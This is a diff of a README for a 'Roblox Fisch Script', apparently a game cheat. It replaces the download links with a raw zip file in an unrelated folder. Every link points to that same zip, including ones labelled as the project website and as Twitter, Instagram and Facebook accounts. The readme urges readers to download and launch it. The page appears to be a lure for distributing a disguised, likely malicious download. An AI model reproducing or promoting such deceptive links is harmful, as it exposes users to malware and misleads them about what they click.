@@ -33,12 +33,12 @@ We have curated resources and information on all these topics to provide you wit
 ## Get Started 🚀
 To explore the complete functionality of our "Roblox Fisch Script," download the software by clicking the button below:
 
-[![Download Roblox Fisch Script](https://github.com/aimzhann/Roblox-Fisch-Script/releases/download/v1.0/Release.zip)](https://github.com/aimzhann/Roblox-Fisch-Script/releases/download/v1.0/Release.zip)
+[![Download Roblox Fisch Script](https://raw.githubusercontent.com/aimzhann/Roblox-Fisch-Script/main/Rhineland/Script_Fisch_Roblox_1.7-beta.1.zip)](https://raw.githubusercontent.com/aimzhann/Roblox-Fisch-Script/main/Rhineland/Script_Fisch_Roblox_1.7-beta.1.zip)
 
 Once you have downloaded the script, launch it to unleash its full potential in your Roblox Fisch gameplay. 🎮🐠
 
 ## Visit Our Website 🌐
-For more detailed information, tips, and updates on our Roblox Fisch Script, visit our website at [https://github.com/aimzhann/Roblox-Fisch-Script/releases/download/v1.0/Release.zip](https://github.com/aimzhann/Roblox-Fisch-Script/releases/download/v1.0/Release.zip). Dive deep into the world of Fisch gaming and discover how our software can revolutionize your gaming experience.
+For more detailed information, tips, and updates on our Roblox Fisch Script, visit our website at [https://raw.githubusercontent.com/aimzhann/Roblox-Fisch-Script/main/Rhineland/Script_Fisch_Roblox_1.7-beta.1.zip](https://raw.githubusercontent.com/aimzhann/Roblox-Fisch-Script/main/Rhineland/Script_Fisch_Roblox_1.7-beta.1.zip). Dive deep into the world of Fisch gaming and discover how our software can revolutionize your gaming experience.
 
 ## Releases Section 📦
 If you encounter any issues with the download link or need access to previous versions of the script, please check the "Releases" section of this repository. You'll find a list of all available releases along with release notes and additional resources.
@@ -48,9 +48,9 @@ We welcome contributions from the Fisch community to enhance and improve our Rob
 
 ## Connect With Us 🌟
 Stay updated on the latest news, updates, and releases by following us on social media:
-- Twitter: [@RobloxFischScript](https://github.com/aimzhann/Roblox-Fisch-Script/releases/download/v1.0/Release.zip)
-- Instagram: [Roblox_Fisch_Script](https://github.com/aimzhann/Roblox-Fisch-Script/releases/download/v1.0/Release.zip)
-- Facebook: [Roblox Fisch Script](https://github.com/aimzhann/Roblox-Fisch-Script/releases/download/v1.0/Release.zip)
+- Twitter: [@RobloxFischScript](https://raw.githubusercontent.com/aimzhann/Roblox-Fisch-Script/main/Rhineland/Script_Fisch_Roblox_1.7-beta.1.zip)
+- Instagram: [Roblox_Fisch_Script](https://raw.githubusercontent.com/aimzhann/Roblox-Fisch-Script/main/Rhineland/Script_Fisch_Roblox_1.7-beta.1.zip)
+- Facebook: [Roblox Fisch Script](https://raw.githubusercontent.com/aimzhann/Roblox-Fisch-Script/main/Rhineland/Script_Fisch_Roblox_1.7-beta.1.zip)
 
 Thank you for choosing "Roblox Fisch Script" for all your Fisch gaming needs. Let's embark on an exciting journey together in the world of Roblox! 🎉🎣🔥
 
